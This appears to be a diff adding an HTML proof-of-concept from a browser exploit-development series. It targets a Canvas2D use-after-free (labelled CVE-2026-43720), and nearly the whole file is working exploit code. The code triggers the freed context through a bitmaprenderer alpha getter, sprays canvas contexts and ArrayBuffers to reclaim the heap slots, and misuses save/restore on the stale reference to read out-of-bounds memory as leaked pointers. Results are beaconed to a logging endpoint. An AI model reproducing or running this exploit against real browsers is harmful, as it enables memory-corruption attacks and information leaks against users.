@@ -1,0 +1,378 @@
+<!--
+  p667: OOB state stack read via Canvas2D save-count mismatch
+  
+  pastawithpesto hypothesis: CVE-2026-43720 UAF stale wrapper retains
+  m_stateStack with m_size=N (from N-1 saves) while the reclaiming
+  new context has m_size=1. Reading last() on the stale ref indexes
+  buffer[N-1] which is past the end of the new 1-State buffer.
+  Adjacent heap data read as float64 → pointer leak.
+  
+  Our adaptation:
+  1. Trigger Canvas2D UAF (bitmaprenderer + alpha getter → 2d inner)
+  2. Same-type spray (150 contexts) reclaims the freed 768B slot
+  3. Call save() multiple times on stale ref BEFORE spray
+  4. After reclaim, read lineWidth/transform → if the stale wrapper's
+     state stack index disagrees with the reclaimed context's buffer,
+     we read OOB
+  
+  Key insight: Canvas2D state is a Vector<State>. Each save() pushes
+  a copy. The stale wrapper thinks the vector has N entries. The
+  reclaiming context has 1 entry. If the Vector backing store was
+  reallocated during save() and the old backing store is freed,
+  the stale read goes to whatever reused that memory.
+  
+  CRASH_CLASS: HIGH (OOB read may crash if unmapped)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p667</title></head>
+<body>p667: OOB state stack read
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function(){
+'use strict';
+var L=document.getElementById('log'),bQ=[];
+function emit(t,m){var s=t+(m!==undefined?' '+m:'');L.textContent+=s+'\n';bQ.push(s);if(bQ.length>=2)flush();}
+function flush(){if(!bQ.length)return;var b=bQ.splice(0,3).join('|');try{var x=new XMLHttpRequest();x.open('GET','/beacon/P667-'+encodeURIComponent(b),false);x.send();}catch(e){}}
+window.onerror=function(m){emit('ERR',String(m).slice(0,120));flush();};
+var f64=new Float64Array(1),u8=new Uint8Array(f64.buffer);
+function d2hex(d){f64[0]=d;var h='';for(var i=7;i>=0;i--)h+=('0'+u8[i].toString(16)).slice(-2);return h;}
+
+emit('START','v1');flush();
+
+// ================================================================
+// PHASE A: Basic Canvas2D UAF + save before spray
+// Save N times on the stale ref, then spray, then read
+// ================================================================
+emit('A','save-before-spray');
+try{
+  var canvA=document.createElement('canvas');
+  canvA.width=1;canvA.height=1;
+  var innerCtxA=null;
+  var outerA=canvA.getContext('bitmaprenderer',{
+    get alpha(){
+      innerCtxA=canvA.getContext('2d');
+      return true;
+    }
+  });
+
+  if(!innerCtxA){emit('A-FAIL','no inner context');flush();}
+  else{
+    // Set known values on the stale ref
+    innerCtxA.lineWidth=42.5;
+    innerCtxA.globalAlpha=0.777;
+
+    // Save multiple times to grow the state stack
+    for(var i=0;i<8;i++) innerCtxA.save();
+
+    // Set different values at each save level
+    innerCtxA.lineWidth=99.99;
+    innerCtxA.globalAlpha=0.123;
+
+    emit('A-PRE','saves=8,lw='+innerCtxA.lineWidth+',ga='+innerCtxA.globalAlpha);
+
+    // Now spray to reclaim the freed context
+    var sprayA=[];
+    for(var i=0;i<150;i++){
+      var c=document.createElement('canvas');
+      c.width=1;c.height=1;
+      sprayA.push(c.getContext('2d'));
+    }
+
+    // Read from the stale ref — does it read OOB?
+    var lwPost, gaPost, txPost;
+    try{
+      lwPost=innerCtxA.lineWidth;
+      gaPost=innerCtxA.globalAlpha;
+      var tx=innerCtxA.getTransform();
+      txPost=[tx.a,tx.b,tx.c,tx.d,tx.e,tx.f];
+    }catch(e){
+      emit('A-READ-ERR',e.name+':'+e.message);
+    }
+
+    emit('A-POST','lw='+lwPost+',ga='+gaPost);
+    if(txPost) emit('A-TX',txPost.map(function(v){return d2hex(v);}).join(','));
+
+    // Check if values are our spray's defaults (1.0 lineWidth, 1.0 alpha)
+    // or something unexpected (OOB data)
+    if(lwPost===42.5||lwPost===99.99){
+      emit('A-VERDICT','STALE-VALUE — reading from old state (no OOB)');
+    } else if(lwPost===1){
+      emit('A-VERDICT','SPRAY-DEFAULT — reading reclaimed context default');
+    } else {
+      emit('A-VERDICT','UNEXPECTED lw='+lwPost+' hex='+d2hex(lwPost)+' — possible OOB!');
+    }
+  }
+}catch(e){emit('A-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE B: Restore after spray — force state stack index mismatch
+// ================================================================
+emit('B','restore-after-spray');
+try{
+  var canvB=document.createElement('canvas');
+  canvB.width=1;canvB.height=1;
+  var innerCtxB=null;
+  var outerB=canvB.getContext('bitmaprenderer',{
+    get alpha(){
+      innerCtxB=canvB.getContext('2d');
+      return true;
+    }
+  });
+
+  if(!innerCtxB){emit('B-FAIL','no inner');flush();}
+  else{
+    // Save many times
+    innerCtxB.lineWidth=11.11;
+    for(var i=0;i<16;i++){
+      innerCtxB.save();
+      innerCtxB.lineWidth=20+i;
+    }
+    emit('B-PRE','saves=16,lw='+innerCtxB.lineWidth);
+
+    // Spray
+    var sprayB=[];
+    for(var i=0;i<150;i++){
+      var c=document.createElement('canvas');
+      c.width=1;c.height=1;
+      sprayB.push(c.getContext('2d'));
+    }
+
+    // Now restore repeatedly — each restore pops from state stack
+    // If the reclaimed context has a shorter stack, restore reads OOB
+    var restoreResults=[];
+    for(var i=0;i<20;i++){
+      try{
+        innerCtxB.restore();
+        var lw=innerCtxB.lineWidth;
+        var ga=innerCtxB.globalAlpha;
+        restoreResults.push({i:i,lw:lw,ga:ga,lwHex:d2hex(lw)});
+      }catch(e){
+        restoreResults.push({i:i,err:e.name});
+        break;
+      }
+    }
+
+    for(var k=0;k<restoreResults.length;k++){
+      var r=restoreResults[k];
+      if(r.err) emit('B-R'+k,'ERROR:'+r.err);
+      else emit('B-R'+k,'lw='+r.lw+',ga='+r.ga+',hex='+r.lwHex);
+    }
+
+    // Check for non-standard values
+    var anomalies=restoreResults.filter(function(r){
+      return !r.err && r.lw!==1 && r.lw!==11.11 && (r.lw<20||r.lw>35);
+    });
+    if(anomalies.length>0){
+      emit('B-VERDICT','ANOMALY — '+anomalies.length+' unexpected values!');
+      for(var k=0;k<Math.min(anomalies.length,5);k++)
+        emit('B-ANOM','i='+anomalies[k].i+',lw='+anomalies[k].lw+',hex='+anomalies[k].lwHex);
+    } else {
+      emit('B-VERDICT','normal-values (saves/restores consistent)');
+    }
+  }
+}catch(e){emit('B-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE C: Many saves then read all numeric properties
+// Dump every readable double for OOB candidates
+// ================================================================
+emit('C','deep-save-readall');
+try{
+  var canvC=document.createElement('canvas');
+  canvC.width=1;canvC.height=1;
+  var innerCtxC=null;
+  var outerC=canvC.getContext('bitmaprenderer',{
+    get alpha(){
+      innerCtxC=canvC.getContext('2d');
+      return true;
+    }
+  });
+
+  if(!innerCtxC){emit('C-FAIL','no inner');flush();}
+  else{
+    // Set distinctive values
+    innerCtxC.lineWidth=77.77;
+    innerCtxC.miterLimit=88.88;
+    innerCtxC.globalAlpha=0.555;
+    innerCtxC.shadowBlur=33.33;
+    innerCtxC.shadowOffsetX=44.44;
+    innerCtxC.shadowOffsetY=55.55;
+    innerCtxC.lineDashOffset=66.66;
+
+    // Save 32 times (force Vector reallocation)
+    for(var i=0;i<32;i++) innerCtxC.save();
+
+    // Change values at deepest level
+    innerCtxC.lineWidth=111.111;
+    innerCtxC.setTransform(1.5,2.5,3.5,4.5,5.5,6.5);
+
+    emit('C-PRE','saves=32,lw='+innerCtxC.lineWidth);
+
+    // Spray
+    var sprayC=[];
+    for(var i=0;i<200;i++){
+      var c=document.createElement('canvas');
+      c.width=1;c.height=1;
+      var ctx=c.getContext('2d');
+      // Set spray values to distinguish from stale
+      ctx.lineWidth=1;
+      ctx.globalAlpha=1;
+      sprayC.push(ctx);
+    }
+
+    // Read all numeric properties
+    var props=['lineWidth','miterLimit','globalAlpha','shadowBlur',
+               'shadowOffsetX','shadowOffsetY','lineDashOffset'];
+    var readings={};
+    for(var p=0;p<props.length;p++){
+      try{
+        var val=innerCtxC[props[p]];
+        readings[props[p]]={val:val,hex:d2hex(val)};
+      }catch(e){
+        readings[props[p]]={err:e.name};
+      }
+    }
+
+    // Read transform
+    try{
+      var tx=innerCtxC.getTransform();
+      readings['tx.a']={val:tx.a,hex:d2hex(tx.a)};
+      readings['tx.b']={val:tx.b,hex:d2hex(tx.b)};
+      readings['tx.c']={val:tx.c,hex:d2hex(tx.c)};
+      readings['tx.d']={val:tx.d,hex:d2hex(tx.d)};
+      readings['tx.e']={val:tx.e,hex:d2hex(tx.e)};
+      readings['tx.f']={val:tx.f,hex:d2hex(tx.f)};
+    }catch(e){
+      readings['transform']={err:e.name};
+    }
+
+    for(var key in readings){
+      var r=readings[key];
+      if(r.err) emit('C-'+key,'ERROR:'+r.err);
+      else emit('C-'+key,'val='+r.val+',hex='+r.hex);
+    }
+
+    // Check for unexpected values (not our set values, not defaults)
+    var known=[77.77,88.88,0.555,33.33,44.44,55.55,66.66,111.111,
+               1.5,2.5,3.5,4.5,5.5,6.5,1,0,1,0];
+    var unexpected=[];
+    for(var key in readings){
+      var r=readings[key];
+      if(r.err) continue;
+      var isKnown=false;
+      for(var ki=0;ki<known.length;ki++){
+        if(Math.abs(r.val-known[ki])<0.001){isKnown=true;break;}
+      }
+      if(!isKnown && r.val!==0) unexpected.push({key:key,val:r.val,hex:r.hex});
+    }
+
+    if(unexpected.length>0){
+      emit('C-VERDICT','UNEXPECTED — '+unexpected.length+' non-standard values!');
+      for(var k=0;k<unexpected.length;k++)
+        emit('C-UNEXP',unexpected[k].key+'='+unexpected[k].val+',hex=0x'+unexpected[k].hex);
+    } else {
+      emit('C-VERDICT','all-known-values (no OOB read detected)');
+    }
+  }
+}catch(e){emit('C-ERR',e.name+':'+e.message);}
+flush();
+
+// ================================================================
+// PHASE D: Save on stale ref AFTER spray (pastawithpesto's exact flow)
+// The stale ref's save() pushes to a Vector that might be the
+// reclaimed context's smaller Vector → realloc → old buffer freed
+// → grow back → reads freed buffer data
+// ================================================================
+emit('D','save-after-spray');
+try{
+  var canvD=document.createElement('canvas');
+  canvD.width=1;canvD.height=1;
+  var innerCtxD=null;
+  var outerD=canvD.getContext('bitmaprenderer',{
+    get alpha(){
+      innerCtxD=canvD.getContext('2d');
+      return true;
+    }
+  });
+
+  if(!innerCtxD){emit('D-FAIL','no inner');flush();}
+  else{
+    // DON'T save before spray
+    innerCtxD.lineWidth=42.5;
+    emit('D-PRE','lw='+innerCtxD.lineWidth);
+
+    // Spray
+    var sprayD=[];
+    for(var i=0;i<150;i++){
+      var c=document.createElement('canvas');
+      c.width=1;c.height=1;
+      sprayD.push(c.getContext('2d'));
+    }
+
+    // Now save on the stale ref AFTER reclaim
+    // This pushes to the reclaimed context's state stack
+    var saveResults=[];
+    for(var s=0;s<10;s++){
+      try{
+        innerCtxD.save();
+        var lw=innerCtxD.lineWidth;
+        saveResults.push({s:s,lw:lw,hex:d2hex(lw)});
+      }catch(e){
+        saveResults.push({s:s,err:e.name});
+        break;
+      }
+    }
+
+    for(var k=0;k<saveResults.length;k++){
+      var r=saveResults[k];
+      if(r.err) emit('D-S'+k,'ERROR:'+r.err);
+      else emit('D-S'+k,'lw='+r.lw+',hex='+r.hex);
+    }
+
+    // Now try AB spray to reclaim old Vector backing store
+    var abSpray=[];
+    for(var i=0;i<500;i++){
+      var ab=new ArrayBuffer(128);
+      var dv=new Float64Array(ab);
+      for(var j=0;j<16;j++) dv[j]=0xDEAD0000+i+j*0.001;
+      abSpray.push(ab);
+    }
+
+    // Restore back — reads from whatever is at the state stack position
+    var restoreD=[];
+    for(var s=0;s<12;s++){
+      try{
+        innerCtxD.restore();
+        var lw=innerCtxD.lineWidth;
+        var ga=innerCtxD.globalAlpha;
+        restoreD.push({s:s,lw:lw,ga:ga,lwHex:d2hex(lw),gaHex:d2hex(ga)});
+      }catch(e){
+        restoreD.push({s:s,err:e.name});
+        break;
+      }
+    }
+
+    for(var k=0;k<restoreD.length;k++){
+      var r=restoreD[k];
+      if(r.err) emit('D-R'+k,'ERROR:'+r.err);
+      else emit('D-R'+k,'lw='+r.lw+',ga='+r.ga+',lwH='+r.lwHex);
+    }
+
+    var anomD=restoreD.filter(function(r){
+      return !r.err && r.lw!==42.5 && r.lw!==1 && r.lw!==0;
+    });
+    if(anomD.length>0){
+      emit('D-VERDICT','ANOMALY — '+anomD.length+' unexpected values after restore!');
+    } else {
+      emit('D-VERDICT','normal-restore-values');
+    }
+  }
+}catch(e){emit('D-ERR',e.name+':'+e.message);}
+flush();
+
+emit('DONE','p667-complete');flush();
+})();
+</script>
+</body>
+</html>
